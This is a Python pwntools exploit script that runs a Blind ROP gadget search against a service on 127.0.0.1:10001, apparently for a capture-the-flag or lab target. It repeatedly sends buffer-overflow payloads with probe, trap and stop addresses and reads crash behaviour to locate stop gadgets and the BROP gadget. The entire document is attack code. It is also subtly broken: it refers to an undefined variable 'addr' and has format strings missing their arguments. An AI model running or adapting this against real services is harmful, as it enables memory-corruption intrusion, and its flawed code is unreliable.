from pwn import *

def get_brop_gadget(size = 72, stop_address = 0x400545):
    stops = []

    stop = stop_address
    trap = 0x00000000
    probe = 0x4006c0

    while 1:

#           ^       |                  |                   |
#           |       v (no pop)         v (exactly 6 pops)  v (too many pops)
#         probe | trap | ... | trap | stop | trap | ... | trap | ...
        
        payload = size * b'A'
        payload += p64(probe)
        payload += p64(trap) * 6
        payload += p64(stop)
        payload += p64(trap) * 6

        try:
            p = remote('127.0.0.1', 10001, timeout = 2)
            p.recvline()
            p.sendline(payload)
            p.recvline()
            p.close()
            
            log.info("0x%x is a good candidate!")

            # Stop gadget ?
            
            #           ^       |                  |                   |
            #           |       v (no pop)         v (exactly 6 pops)  v (too many pops)
            #         probe | trap | ... | trap | TRAP | trap | ... | trap | ...
            
            try:
                log.info("second try")
                payload = size * b'A'
                payload += p64(probe)
                payload += p64(trap) * 13

                p = remote('127.0.0.1', 10001, timeout = 2)
                p.recvline()
                p.sendline(payload)
                p.recvline()
                p.close()

                stops.append(probe)
                
                log.info("0x%x is a stop gadget" % probe)
                probe += 1
                
            except EOFError:
                p.close()
                log.info("Brop gadget found!")
                return addr
              
            except Exception:
                log.info("Bad connection!")
                continue

        except EOFError:
            p.close()
            log.info("Not even likely!" % addr)
            addr += 1
            
        except Exception:
            p.close()
            log.info("Bad connection!")
            continue
    
    print("The stop gadgets are ")
    
    for i in stops:
        print("0x%x " % i)
    
    print(".\n")

brop_gadget = get_brop_gadget()
print("The brop gadget is at 0x%x." % brop_gadget)
